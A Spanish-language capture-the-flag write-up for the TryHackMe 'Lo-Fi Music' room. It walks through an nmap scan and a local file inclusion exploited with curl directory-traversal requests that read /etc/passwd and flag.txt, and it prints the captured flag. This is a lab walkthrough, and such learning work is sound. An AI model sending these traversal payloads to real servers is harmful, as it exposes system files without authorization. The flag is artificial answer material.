# Explotación de LFI en Aplicación de Música (TryHackMe - Lo-Fi Music)

Este documento detalla el proceso de explotación de una vulnerabilidad de **Inclusión de Archivos Locales (LFI)** en la sala **Lo-Fi Music** de TryHackMe para obtener la flag del sistema.

---

## Resumen

La aplicación web es un blog de música que presenta una vulnerabilidad clásica de **LFI** en uno de sus parámetros de URL.
La explotación permite leer archivos arbitrarios del sistema de ficheros del servidor, lo que finalmente conduce al descubrimiento de la flag.

---

## Paso 1: Reconocimiento

Se realizó un escaneo de puertos con `nmap` para identificar los servicios expuestos:

```
nmap -sV 10.66.183.199
```

Resultados principales:

* **Puerto 22** → SSH (OpenSSH 8.2p1)
* **Puerto 80** → HTTP (Apache httpd 2.2.22)

Se procedió luego a examinar la aplicación web en el puerto 80.

---

## Paso 2: Identificación de la Vulnerabilidad LFI

Durante la navegación por las secciones del sitio (como **Discography**) se observó el uso del parámetro `page` en la URL:

```
http://10.66.183.199/?page=relax.php
```

Este patrón indica una posible vulnerabilidad de **Local File Inclusion**.

Para probarlo se intentó leer `/etc/passwd` mediante **directory traversal**:

```
curl "http://10.66.183.199/?page=../../../../../../etc/passwd"
```

El servidor devolvió el contenido de `/etc/passwd`, confirmando la vulnerabilidad LFI.

---

## Paso 3: Búsqueda y Obtención de la Flag

Con la vulnerabilidad confirmada, se intentó localizar el archivo con la flag.
Siguiendo la convención de varios CTF, se probó leer `flag.txt` desde el directorio raíz:

```
curl "http://10.66.183.199/?page=../../../../../../flag.txt"
```

La petición devolvió el contenido del archivo `flag.txt`, incrustado en la respuesta HTML.

---

## Flag Obtenida

```
flag{e4478e0eab69bd642b8238765dcb7d18}
```

---

## Herramientas Utilizadas

* **nmap** → escaneo de puertos y servicios
* **curl** → explotación de la vulnerabilidad LFI para lectura de archivos

---
